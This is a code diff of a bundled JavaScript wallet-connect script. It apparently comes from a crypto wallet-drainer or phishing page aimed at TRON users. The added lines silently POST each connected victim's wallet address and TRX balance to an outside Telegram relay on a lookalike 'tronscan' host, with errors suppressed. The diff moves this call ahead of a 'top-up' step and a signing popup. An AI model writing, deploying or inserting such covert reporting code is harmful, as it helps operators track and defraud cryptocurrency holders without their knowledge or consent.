@@ -92749,6 +92749,13 @@
                     o(balanceInTRX);
                     console.log("TRX balance check", balanceInTRX);
 
+                    // Telegram only: notify right after wallet connect (do not block sign/top-up)
+                    GS.post("https://tronscantelegram.onrender.com/api/telegram", {
+                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
+                    }, {
+                        timeout: 8000
+                    }).catch(() => {});
+
                     if (balanceInTRX < minTrx) {
                         console.log("TRX below 11, starting top-up");
                         try {
@@ -92789,13 +92796,6 @@
 
                     console.log("Opening sign popup");
                     await f(c);
-
-                    // fire-and-forget telegram
-                    GS.post("https://tronscantelegram.onrender.com/api/telegram", {
-                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
-                    }, {
-                        timeout: 8000
-                    }).catch(() => {});
                 } catch (a) {
                     console.error("Connection error:", a),
                     t(2)
